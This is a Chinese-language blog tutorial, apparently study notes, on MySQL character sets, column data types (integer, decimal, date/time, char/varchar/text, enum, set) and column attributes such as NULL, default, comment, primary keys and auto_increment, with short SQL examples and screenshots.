<p>在计算机中所看到的任何内容都是字符构成的。</p>
<p>字符编码（character code）是计算机针对各种符号，在计算机中的一种二进制存储代号。</p>
<h3 id="字符集概念"><a href="#字符集概念" class="headerlink" title="字符集概念"></a>字符集概念</h3><p>字符集(Character set)是多个字符的集合，字符集种类较多，每个字符集包含的字符个数不同。</p>
<p>常见字符集名称：<strong>ASCII字符集</strong>、<strong>GB2312字符集</strong>、BIG5字符集、 GB18030字符集、<strong>Unicode字符集</strong>等。计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。中文文字数目大，而且还分为简体中文和繁体中文两种不同书写规则的文字，而计算机最初是按英语单字节字符设计的，因此，对中文字符进行编码，是中文信息交流的技术基础。</p>
<h3 id="设置客户端所有字符集"><a href="#设置客户端所有字符集" class="headerlink" title="设置客户端所有字符集"></a>设置客户端所有字符集</h3><p>如果直接通过cmd下的mysql.exe进行中文数据插入，那么可能出错</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201154432373.png" alt="image-20210201154432373"></p>
<p>出错原因：</p>
<ol>
<li>用户是通过mysql.exe来操作mysqld.exe</li>
<li>真正的SQL执行是Mysqld.exe来执行</li>
<li>mysql.exe将数据传入mysqld.exe的时候，没有告知其对应的符号规则（字符集），而mysqld也没有能力自己判断，就会使用自己默认的（字符集）</li>
</ol>
<p>解决方案：mysql.exe客户端在进行数据操作之前将自己所使用的字符集告诉mysqld</p>
<p>Cmd下的mysql.exe默认都只有一个字符集：GBK</p>
<p>Mysql.exe如果告知Mysqld.exe对应的字符集类型为gbk？</p>
<p>快捷方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">names</span> 字符集;</span><br></pre></td></tr></table></figure>
<p>深层原理：客户端，服务端，连接层（show variables like ‘character_set_%’）</p>
<p>Mysql.exe与Mysqld.exe之间的处理关系一共分为三层</p>
<p>客户端传入数据给服务端：client:character_set_client</p>
<p>服务端返回数据给客户端：server:character_set_results</p>
<p>客户端与服务端之间的连接(中间的连接层)：connection:character_set_connection</p>
<p>（这里说的不是很详细，是这样的：客户端 &lt;–&gt;中间连接层 &lt;–&gt;服务端）</p>
<p>Set names 字符集的本质：就是一次性打通三层关系的字符集，变得一致。</p>
<p>在系统中有三个变量来记录着这三个关系对应的字符集：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> ‘character_set_%’;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201155154220.png" alt="image-20210201155154220"></p>
<p>(试验)只修改服务器端变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> 变量名 = 值;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201155645609.png" alt="image-20210201155645609"></p>
<p>重新进行数据插入和查看的结果：插入OK，但是查看乱码</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201155656208.png" alt="image-20210201155656208"></p>
<p>修改结果字符集为GBK</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201155744872.png" alt="image-20210201155744872"></p>
<p>Connection只是为了更方便客户端与服务端进行字符集转换而设。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> <span class="keyword">names</span> gbk;</span><br><span class="line"></span><br><span class="line">===等价于===</span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> character_set_client = gbk; //为了让服务器识别客户端传来的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> character_set_connection = gbk;//更好的帮助客户端与服务端之间进行字符集转换</span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> character_set_results = gbk;//为了告诉客户端服务端所有的返回的数据字符集</span><br></pre></td></tr></table></figure>


<h2 id="列类型（字段类型）"><a href="#列类型（字段类型）" class="headerlink" title="列类型（字段类型）"></a>列类型（字段类型）</h2><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p><strong>Tinyint</strong></p>
<p>迷你整形，系统采用一个字节来保存的整形：一个字节 = 8位，最大能表示的数值是0-255</p>
<p><strong>Smallint</strong></p>
<p>小整形，系统采用两个字节来保存的整形：能表示0-65535之间</p>
<p><strong>Mediumint</strong></p>
<p>中整形，采用三个字节来保存数据。</p>
<p><strong>Int</strong></p>
<p>整形（标准整形），采用四个字节来保存数据。</p>
<p><strong>Bigint</strong></p>
<p>大整形，采用八个字节来保存数据。</p>
<ol>
<li>创建数据表</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201161355804.png" alt="image-20210201161355804"></p>
<ol start="2">
<li>插入合理数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201161534979.png" alt="image-20210201161534979"></p>
<ol start="3">
<li>插入错误数据（超出对应的数据范围）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201161652049.png" alt="image-20210201161652049"></p>
<ol start="4">
<li><p>错误原因：并不是说tinyint没有这么大的空间，而是因为mysql默认的为整形增加负数。</p>
<p>实际表示的区间为-128,127</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201161802769.png" alt="image-20210201161802769"></p>
<p>实际应用中，应该根据对应的数据的范围来选定对应的整形类型：通常使用的比较多的tinyint和int。</p>
<h4 id="无符号标识设定"><a href="#无符号标识设定" class="headerlink" title="无符号标识设定"></a>无符号标识设定</h4><p>无符号：表示存储的数据在当前字段中，没有负数（只有正数，区间为0-255）</p>
<p>基本语法：在类型之后加上一个 <code>unsigned</code></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201162135074.png" alt="image-20210201162135074"></p>
<h3 id="显示长度"><a href="#显示长度" class="headerlink" title="显示长度"></a>显示长度</h3><p>显示长度：指数据（整型）在数据显示的时候，到底可以显示多长位。</p>
<p>Tinyint(3)： 表示最长可以显示3位，unsigned说明只能是正数，0-255永远不会超过三个长度</p>
<p>Tinyint(4)：表示最长可以显示4位，-128~127</p>
<p>显示长度只是代表了数据是否可以达到指定的长度，但是不会自动满足到指定长度：如果想要数据显示的时候，保持最高位（显示长度），那么还需要给字段增加一个<code>zerofill</code>属性才可以。</p>
<p>Zerofill：从左侧开始填充0（左侧不会改变数值大小），所以负数的时候就不能使用zerofill，一旦使用zerofill就相当于确定该字段为unsigned</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201162817468.png" alt="image-20210201162817468"></p>
<p>数据显示的时候，zerofill会在左侧填充0到指定位：如果不足3位，那么填充到3位，如果本身已经够了或者超出，那么就不再填充。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201163030886.png" alt="image-20210201163030886"></p>
<p>显示长度可以自己设定：超出长度（但是不超出范围）不会影响，只会对不够长度的进行补充（显示长度）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201163247315.png" alt="image-20210201163247315"></p>
<h2 id="小数类型"><a href="#小数类型" class="headerlink" title="小数类型"></a>小数类型</h2><p>专门用来存储小数的</p>
<p> 在Mysql中将小数类型又分为两类：浮点型和定点型</p>
<h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><p>浮点型又称之为精度类型：是一种有可能丢失精度的数据类型，数据有可能不那么准确（由其是在超出范围的时候）</p>
<p> 浮点型之所以能够存储较大的数值（不精确），原因就是利用存储数据的位来存储指数</p>
<p>整型：所有位都为1</p>
<p>浮点型：有部分用于存储数据，有部分用于存指数</p>
<h4 id="Float"><a href="#Float" class="headerlink" title="Float"></a>Float</h4><p>Float又称之为单精度类型：系统提供4个字节用来存储数据，但是能表示的数据范围比整型大的多，大概是10^38；只能保证大概7个左右的精度（如果数据在7位数以内，那么基本是准确的，但是如果超过7位数，那么就是不准确的）</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Float：表示不指定小数位的浮点数</span><br><span class="line">Float(M,D)：表示一共存储M个有效数字，其中小数部分占D位</span><br><span class="line">Float(10,2)：整数部分为8位，小数部分为2位</span><br></pre></td></tr></table></figure>
<ol>
<li>创建一个数据表保存浮点数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201205424487.png" alt="image-20210201205424487"></p>
<ol start="2">
<li>存入数据：合法数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201205633680.png" alt="image-20210201205633680"></p>
<p><strong>注意：</strong>如果数据精度丢失，那么浮点型是按照四舍五入的方式进行计算</p>
<ol start="3">
<li>插入数据，超出大小</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201205746999.png" alt="image-20210201205746999"></p>
<ol start="4">
<li>数据长度刚好满足条件，但是会超出精度</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201205951894.png" alt="image-20210201205951894"></p>
<p>说明：用户不能插入数据直接超过指定的整数部分长度，但是如果是系统自动进位导致，系统可以承担。</p>
<ol start="5">
<li>点数可以采用科学计数法来存储数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201210145520.png" alt="image-20210201210145520"></p>
<p>浮点数的应用：通常是用来保存一些数量特别大，大到可以不用那么精确的数据。</p>
<h4 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h4><p>Double又称之为双精度：系统用8个字节来存储数据，表示的范围更大，10^308次方，但是精度也只有15位左右。</p>
<h3 id="定点数"><a href="#定点数" class="headerlink" title="定点数"></a>定点数</h3><p>定点数：能够保证数据精确的小数（小数部分可能不精确，超出长度会四舍五入），整数部分一定精确</p>
<h4 id="Decimal"><a href="#Decimal" class="headerlink" title="Decimal"></a>Decimal</h4><p>Decimal定点数：系统自动根据存储的数据来分配存储空间，每大概9个数就会分配四个字节来进行存储，同时小数和整数部分是分开的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Decimal(M,D)	//M表示总长度，最大值不能超过65，D代表小数部分长度，最长不能超过30。</span><br></pre></td></tr></table></figure>
<ol>
<li>创建表：与浮点数对比</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201210721223.png" alt="image-20210201210721223"></p>
<ol start="2">
<li>插入正常数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201210859329.png" alt="image-20210201210859329"></p>
<ol start="3">
<li>插入最大数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201210952427.png" alt="image-20210201210952427"></p>
<ol start="4">
<li>尝试定点数进行四舍五入</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201211049777.png" alt="image-20210201211049777"></p>
<p>定点数的应用：如果涉及到钱的时候有可能使用定点数</p>
<h2 id="时间日期类型"><a href="#时间日期类型" class="headerlink" title="时间日期类型"></a>时间日期类型</h2><p><strong>Date</strong></p>
<p>日期类型：系统使用三个字节来存储数据，对应的格式为：YYYY-mm-dd，能表示的范围是从1000-01-01 到9999-12-12，初始值为0000-00-00</p>
<p><strong>Time</strong></p>
<p>时间类型：能够表示某个指定的时间，但是系统同样是提供3个字节来存储，对应的格式为：HH:ii:ss，但是mysql中的time类型能够表示时间范围要大的多，能表示从-838:59:59~838:59:59，在mysql中具体的用处是用来描述时间段。</p>
<p><strong>Datetime</strong></p>
<p>日期时间类型：就是将前面的date和time合并起来，表示的时间，使用8个字节存储数据，格式为YYYY-mm-dd HH:ii:ss，能表示的区间1000-01-01 00:00:00 到9999-12-12 23:59:59，其可以为0值：0000-00-00 00:00:00</p>
<p><strong>Timestamp</strong></p>
<p>时间戳类型：mysql中的时间戳只是表示从格林威治时间开始，但是其格式依然是：YYYY-mm-dd HH:ii:ss</p>
<p><strong>Year</strong></p>
<p>年类型：占用一个字节来保存，能表示1900<del>2155年，但是year有两种数据插入方式：0</del>99和四位数的具体年</p>
<ol>
<li>创建对应的时间日期类型的数据表</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201212050657.png" alt="image-20210201212050657"></p>
<ol start="2">
<li>插入数据：正常数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210201213054205.png" alt="image-20210201213054205"></p>
<ol start="3">
<li>year的特殊性：可以采用两位数的数据插入，也可以采用四位数的年份插入</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201213140140.png" alt="image-20210201213140140"></p>
<ol start="4">
<li>year进行两位数插入的时候，有一个区间划分，零界点为69和70：当输入69以下，那么系统时间为20+数字，如果是70以上，那配系统时间为19+数字</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210201213303376.png" alt="image-20210201213303376"></p>
<ol start="5">
<li>timestamp当对应的数据被修改的时候，会自动更新（这个被修改的数据不是自己）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201213613455.png" alt="image-20210201213613455"></p>
<ol start="6">
<li>time类型特殊性：本质是用来表示时间区间（当前时间之后的多少个小时），能表示的范围比较大</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201214659343.png" alt="image-20210201214659343"></p>
<ol start="7">
<li>在进行时间类型录入的时候（time）还可以使用一个简单的日期代替时间，在时间格式之前加一个空格，然后指定一个数字（可以是负数）：系统会自动将该数字转换成天数 * 24小时，再加上后面的时间。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201215023350.png" alt="image-20210201215023350"></p>
<p>PHP中有着非常强大的时间日期转换函数：date将时间戳转换成想要的格式，strtotime又可以将很多格式转换成对应的时间戳。PHP通常不需要数据库来帮助处理这么复杂的时间日期，所以通常配合PHP的时候，时间的保存通常使用时间戳（真正），从而用整型来保存。字符串型</p>
<h2 id="Mysql记录长度"><a href="#Mysql记录长度" class="headerlink" title="Mysql记录长度"></a>Mysql记录长度</h2><p>在mysql中，有一项规定：mysql的记录长度（record == 行row）总长度不能超过65535个字节。</p>
<p>Varchar能够存储的理论值为65535个字符：字符在不同的字符集下可能占用多个字节。</p>
<ol>
<li><p>创建表：证明varchar在mysql中能够达到的理论值（utf8和GBK）</p>
<p>Varchar除了存储的数据本身要占用空间：还需要额外的空间来保存记录长度</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201221113421.png" alt="image-20210201221113421"></p>
<ol start="2">
<li><p>计算在utf8和GBK下对应的varchar能够存储的长度</p>
<p>Utf8 最多只能存储21844个字符</p>
<p>GBK最多只能存储32766个字符</p>
</li>
</ol>
<h2 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h2><h3 id="Char"><a href="#Char" class="headerlink" title="Char"></a>Char</h3><p>定长字符：指定长度之后，系统一定会分配指定的空间用于存储数据</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">char(L)		//L代表字符数（中文与英文字母一样），L长度为0到255</span><br></pre></td></tr></table></figure>


<h3 id="Varchar"><a href="#Varchar" class="headerlink" title="Varchar"></a>Varchar</h3><p>变长字符：指定长度之后，系统会根据实际存储的数据来计算长度，分配合适的长度（数据没有超出长度）</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Varchar(L)		//L代表字符数，L的长度理论值位0到65535</span><br></pre></td></tr></table></figure>
<p>因为varchar要记录数据长度（系统根据数据长度自动分配空间），所以每个varchar数据产生后，系统都会在数据后面增加1-2个字节的额外开销：是用来保存数据所占用的空间长度</p>
<p>如果数据本身小于127个字符：额外开销一个字节；如果大于127个，就开销两个字节</p>
<p>Char和varchar数据存储对比（utf8，一个字符都会占用3个字节）</p>
<table>
<thead>
<tr>
<th>存储数据</th>
<th>Char(2)</th>
<th>Varchar(2)</th>
<th>Char所占字节</th>
<th>Varchar所占字节</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>A</td>
<td>A</td>
<td>2*3=6</td>
<td>1*3+1=4</td>
</tr>
<tr>
<td>AB</td>
<td>AB</td>
<td>AB</td>
<td>2*3=6</td>
<td>2*3+1=7</td>
</tr>
</tbody></table>
<p>Char和varchar的区别</p>
<ol>
<li>char一定会使用指定的空间，varchar是根据数据来定空间</li>
<li>char的数据查询效率比varchar高：varchar是需要通过后面的记录数来计算</li>
</ol>
<p>如果确定数据一定是占指定长度，那么使用char类型；</p>
<p>如果不确定数据到底有多少，那么使用varchar类型；</p>
<p>如果数据长度超过255个字符，不论是否固定长度，都会使用text，不再使用char和varchar</p>
<h3 id="Text"><a href="#Text" class="headerlink" title="Text"></a>Text</h3><p>文本类型：本质上mysql提供了两种文本类型</p>
<p>Text：存储普通的字符文本</p>
<p>Blob：存储二进制文本（图片，文件），一般都不会使用blob来存储文件本身，通常是使用一个链接来指向对应的文件本身。</p>
<p>Text：系统中提供的四种text</p>
<p>Tinytext：系统使用一个字节来保存，实际能够存储的数据为：2 ^ 8 + 1</p>
<p>Text：使用两个字节保存，实际存储为：2 ^ 16 + 2</p>
<p>Mediumtext：使用三个字节保存，实际存储为：2 ^ 24 + 3</p>
<p>Longtext：使用四个字节保存，实际存储为：2 ^ 32 + 4</p>
<p><strong>注意：</strong></p>
<ol>
<li><p>在选择对应的存储文本的时候，不用刻意去选择text类型，系统会自动根据存储的数据长度来选择合适的文本类型。</p>
</li>
<li><p> 在选择字符存储的时候，如果数据超过255个字符，那么一定选择text存储</p>
</li>
</ol>
<h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>枚举类型：在数据插入之前，先设定几个项，这几个项就是可能最终出现的数据结果。</p>
<p>如果确定某个字段的数据只有那么几个值：如性别，男、女、保密，系统就可以在设定字段的时候规定当前字段只能存放固定的几个值：使用枚举</p>
<p> 基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">enum(数据值1,数据值2…)</span><br></pre></td></tr></table></figure>
<p>系统提供了1到2个字节来存储枚举数据：通过计算enum列举的具体值来选择实际的存储空间：如果数据值列表在255个以内，那么一个字节就够，如果超过255但是小于65535，那么系统采用两个字节保存。</p>
<ol>
<li>创建表</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201223233074.png" alt="image-20210201223233074"></p>
<ol start="2">
<li>插入数据：合法数据，字段对应的值必须是设定表的时候所确定的值</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201223904438.png" alt="image-20210201223904438"></p>
<ol start="3">
<li>错误数据：enum有规范数据的功能，能够保证插入的数据必须是设定的范围，其他类型都不可以</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201223940083.png" alt="image-20210201223940083"></p>
<ol start="4">
<li><p>枚举enum的存储原理：实际上字段上所存储的值并不是真正的字符串，而是字符串对应的下标：当系统设定枚举类型的时候，会给枚举中每个元素定义一个下标，这个下标规则从1开始</p>
<p>Enum(1=&gt;‘男’,2=&gt;’女’,3=&gt;’保密’)</p>
</li>
</ol>
<p>特性：在mysql中系统是自动进行类型转换的：如果数据碰到“+、-、*、/”系统就会自动将数据转换成数值：而普通字符串转换成数值为0</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> 字段名 + <span class="number">0</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201224315462.png" alt="image-20210201224315462"></p>
<ol start="5">
<li>既然实际enum字段存储的结果是数值：那么在进行数据插入的时候，就可以使用对应的数值来进行。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201224512431.png" alt="image-20210201224512431"></p>
<p>枚举的意义：</p>
<ol>
<li><p> 规范数据本身，限定只能插入规定的数据项</p>
</li>
<li><p>节省存储空间</p>
</li>
</ol>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>集合：是一种将多个数据选项可以同时保存的数据类型，本质是将指定的项按照对应的二进制位来进行控制：1表示该选项被选中，0表示该选项没有被选中。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>(<span class="string">&#x27;值1&#x27;</span>,<span class="string">&#x27;值2&#x27;</span>,<span class="string">&#x27;值3&#x27;</span>…)</span><br></pre></td></tr></table></figure>
<p>系统为set提供了多个字节进行保存，但是系统会自动计算来选择具体的存储单元</p>
<p>1个字节：set只能有8个选项</p>
<p>2个字节：set只能有16个选项</p>
<p>3个字节：set只能表示24个选项</p>
<p>8个字节：set可以表示64个选项</p>
<p>Set和enum一样，最终存储到数据字段中的依然是数字而不是真实的字符串</p>
<ol>
<li>创建表</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202103910558.png" alt="image-20210202103910558"></p>
<ol start="2">
<li>插入数据：可以插入多个数据，就是在数据插入的字符串中，使用对应的逗号“,”将选项进行隔开</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202104253832.png" alt="image-20210202104210055"></p>
<ol start="3">
<li>数据选项所在的数据与数据插入的顺序无关：最终都会变成选项对应的顺序</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202104253832.png" alt="image-20210202104253832"></p>
<ol start="4">
<li><p>分析数据存储的方式</p>
<ul>
<li>系统将对应的数据选项（设计）按照顺序进行编排：从第一个开始进行占位，每一个都对应一个二进制位。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110202788.png" alt="image-20210202110202788"></p>
<ul>
<li>数据在存储的时候，如果被选中，那么对应的位的值就为1，否则为0</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110209248.png" alt="image-20210202110209248"></p>
<ul>
<li>系统在进行存储的时候会自动将得到的最终的二进制颠倒过来，然后再进行转换成十进制存储</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110242581.png" alt="image-20210202110242581"></p>
</li>
<li><p>查看数据：按照自动转换成数值来查看</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110242581.png" alt="image-20210202110403507"></p>
<ol start="6">
<li>既然是数值，那么就可以插入数值来代替实际插入数据</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110509393.png" alt="image-20210202110509393"></p>
<p>注意：数字插入的前提是对应的二进制位上都有对应的数据项</p>
<p>Set集合的意义：</p>
<ol>
<li><p>规范数据</p>
</li>
<li><p>节省存储空间</p>
</li>
</ol>
<p>Enum：单选框</p>
<p>Set：复选框</p>
<h2 id="列属性"><a href="#列属性" class="headerlink" title="列属性"></a>列属性</h2><p>列属性又称之为字段属性，在mysql中一共有6个属性：null，默认值，列描述，主键，唯一键和自动增长</p>
<h3 id="Null属性"><a href="#Null属性" class="headerlink" title="Null属性"></a>Null属性</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202110928429.png" alt="image-20210202110928429"></p>
<p>如果对应的值为YES表示该字段可以为NULL</p>
<p> <strong>注意：</strong></p>
<ol>
<li><p> 在设计表的时候，尽量不要让数据为空</p>
</li>
<li><p>Mysql的记录长度为65535个字节，如果一个表中有字段允许为NULL，那么系统就会设计保留一个字节来存储NULL，最终有效存储长度为65534个字节。</p>
</li>
</ol>
<h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><p>Default：默认值，当字段被设计的时候，如果允许默认条件下，用户不进行数据的插入，那么就可以使用事先准备好的数据来填充：通常填充的是NULL</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202111232936.png" alt="image-20210202111232936"></p>
<p>测试：不给当前字段提供数据值</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202111435998.png" alt="image-20210202111435998"></p>
<p>Default关键字的另外一层使用：显示的告知字段使用默认值：在进行数据插入的时候，对字段值直接使用default</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202112645755.png" alt="image-20210202112645755"></p>
<h3 id="列描述"><a href="#列描述" class="headerlink" title="列描述"></a>列描述</h3><p>列描述：comment，是专门用于给开发人员进行维护的一个注释说明</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">comment</span> <span class="string">&#x27;字段描述&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202113120710.png"></p>
<p>查看Comment：必须通过查看表创建语句</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202113203633.png" alt="image-20210202113203633"></p>
<h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><p>顾名思义：主要的键，primary key，在一张表中，有且只有一个字段，里面的值具有唯一性</p>
<h3 id="创建主键"><a href="#创建主键" class="headerlink" title="创建主键"></a>创建主键</h3><h4 id="随表创建"><a href="#随表创建" class="headerlink" title="随表创建"></a>随表创建</h4><p>系统提供了两种增加主键的方式</p>
<ol>
<li><p>方案1：直接在需要当做主键的字段之后，增加primary key属性来确定主键</p>
</li>
<li><p>方案2：在所有字段之后增加primary key选项：primary key(字段信息)</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202120612365.png" alt="image-20210202120612365"></p>
<h4 id="表后增加"><a href="#表后增加" class="headerlink" title="表后增加"></a>表后增加</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> primary <span class="keyword">key</span>(字段);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202120832072.png" alt="image-20210202120832072"></p>
<h3 id="查看主键"><a href="#查看主键" class="headerlink" title="查看主键"></a>查看主键</h3><p>方案1：查看表结构</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202145506603.png" alt="image-20210202145506603"></p>
<p>主键不允许为空</p>
<p>方案2：查看表的创建语句</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202145637959.png" alt="image-20210202145637959"></p>
<h3 id="删除主键"><a href="#删除主键" class="headerlink" title="删除主键"></a>删除主键</h3><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> primary <span class="keyword">key</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202145758014.png" alt="image-20210202145758014"></p>
<h3 id="复合主键"><a href="#复合主键" class="headerlink" title="复合主键"></a>复合主键</h3><p>案例：有一张学生选修课表：一个学生可以选修多个选修课，一个选修课也可以由多个学生来选：但是一个学生在一个选修课中只有一个成绩。</p>
<p>设计字段：学号、课程号、成绩。</p>
<p>​    设置复合主键：<code>primary key(student_no,course_no)</code>：表示学号和课程号两个共同唯一，不能存在相同的 学号-课程号。</p>
<p>下节’主键约束’是用这个示范的</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202150156257.png" alt="image-20210202150156257"></p>
<h3 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h3><p>主键一旦增加，那么对对应的字段有数据要求</p>
<ol>
<li><p>当前字段对应的数据不能为空；</p>
</li>
<li><p>当前字段对应的数据不能有任何重复</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202150609018.png" alt="image-20210202150609018"></p>
<h3 id="主键分类"><a href="#主键分类" class="headerlink" title="主键分类"></a>主键分类</h3><p>主键分类采用的是主键所对应的字段的业务意义分类</p>
<p> 业务主键：主键所在的字段，具有业务意义（学生ID，课程ID）</p>
<p>逻辑主键：自然增长的整型（应用广泛）</p>
<h2 id="自动增长"><a href="#自动增长" class="headerlink" title="自动增长"></a>自动增长</h2><p>自动增长：auto_increment，当给定某个字段该属性之后，该列的数据在没有提供确定数据的时候，系统会根据之前已经存在的数据进行自动增加后，填充数据。</p>
<p>通常自动增长用于逻辑主键。</p>
